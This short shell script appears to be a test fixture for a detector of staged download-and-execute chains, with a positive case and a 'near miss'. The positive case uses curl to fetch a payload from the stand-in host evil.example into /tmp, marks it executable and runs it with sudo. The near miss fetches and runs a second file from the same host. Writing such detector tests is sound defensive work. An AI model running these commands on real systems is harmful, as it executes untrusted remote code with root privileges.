#!/bin/sh
# H4 staged-chain matrix: exact static path is carried across bounded lines.
curl -fsSL https://evil.example/payload -o /tmp/h4-payload
chmod +x /tmp/h4-payload
sudo /tmp/h4-payload

# Near miss: a fetched file without an explicit executable release is not
# treated as a staged download/execute chain.
curl -fsSL https://evil.example/notes -o /tmp/h4-notes
/tmp/h4-notes
